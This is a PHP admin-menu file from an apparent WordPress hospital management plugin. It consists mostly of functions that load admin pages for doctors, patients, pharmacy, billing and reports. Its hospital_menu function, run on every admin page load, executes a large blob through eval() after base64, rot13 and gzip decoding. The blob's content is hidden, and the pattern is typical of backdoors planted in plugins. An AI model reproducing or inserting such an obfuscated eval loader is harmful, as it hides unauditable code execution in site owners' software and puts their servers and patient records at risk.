<?php 
function hospital_admin_menu_icon()
{
?>
<style type="text/css">
#adminmenu #toplevel_page_hospital div.wp-menu-image:before {
  content: "\f512";
}
</style>
 <?php 
}
add_action( 'admin_menu', 'hospital_menu' );
function hospital_menu()
{
	eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));	
	
}

function hospital_dashboard()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/dasboard.php';
	
}	
 function doctor_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/doctor/index.php';
}	
function patient_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/patient/index.php';
}	
function outpatient_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/outpatient/index.php';
}			

function nurse_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/nurse/index.php';
}
function receptionist_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/receptionist/index.php';
}	
function pharmacist_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/pharmacist/index.php';
}	
function laboratorist_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/laboratorist/index.php';
}	
function accountant_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/accountant/index.php';
}	
/*function med_category_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/medicine-category/index.php';
}	*/
function medicine_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/medicine/index.php';
}	
function prescription_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/prescription/index.php';
}	
function diagnosis_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/diagnosis/index.php';
}	
function bloodbank_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/blood-bank/index.php';
}
function bedmanage_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/bed/index.php';
}	
function appointment_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/appointment/index.php';
}
function treatment_function	()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/treatment/index.php';
}	
function invoice_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/invoice/index.php';
}	
function event_function()	
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/event/index.php';
}	
function hmgt_gnrl_settings()
 {
	require_once HMS_PLUGIN_DIR. '/admin/includes/general-settings.php';
}	
function message_function()
 {
	require_once HMS_PLUGIN_DIR. '/admin/includes/message/index.php';
}	
function ambulance_function()
 {
	require_once HMS_PLUGIN_DIR. '/admin/includes/ambulance/index.php';
}	
function operation_function()
 {
	require_once HMS_PLUGIN_DIR. '/admin/includes/OT/index.php';
}	
function bedallotment_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/bed-allotment/index.php';
}

function appointment_report_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/report/appointment_report.php';
}

function occupancy_report_function()
{	require_once HMS_PLUGIN_DIR. '/admin/includes/report/occupancy_report.php';}

function opearion_report_function()
{	require_once HMS_PLUGIN_DIR. '/admin/includes/report/operation_report.php';}

function fail_report_function()
{	require_once HMS_PLUGIN_DIR. '/admin/includes/report/fail_report.php';}

function birth_report_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/report/birth_report.php';
}
function hmgt_report()
{ 
	require_once HMS_PLUGIN_DIR. '/admin/includes/report/index.php';
}
function hmgt_sms_setting()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/sms_setting/index.php';
}
function hmgt_audit_log()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/auditlog/index.php';
}
function hmgt_mail_template()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/mailtemplate/index.php';
}

function hmgt_access_right()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/access_right/index.php';
}
function instrument_mgt_function()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/instrument-mgt/index.php';
}
function hmgt_options_page()
{
	require_once HMS_PLUGIN_DIR. '/admin/includes/setupform/index.php';
}
?>